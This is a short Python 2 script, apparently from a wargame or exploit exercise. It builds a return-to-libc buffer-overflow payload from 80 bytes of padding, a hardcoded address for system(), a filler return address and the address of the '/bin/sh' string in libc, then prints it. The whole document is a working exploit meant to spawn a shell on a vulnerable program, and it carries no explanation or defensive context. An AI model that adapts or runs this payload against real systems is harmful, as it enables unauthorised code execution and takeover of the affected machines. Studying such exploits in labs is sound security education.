#!/usr/bin/env python2.6

import struct

system_address = struct.pack("I", 0xb7ecffb0)
shellcode_address = struct.pack("I", 0xB7FB63BF) # Adress of /bin/sh in libc

buff = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
payload = buff + system_address + "AAAA" + shellcode_address

print payload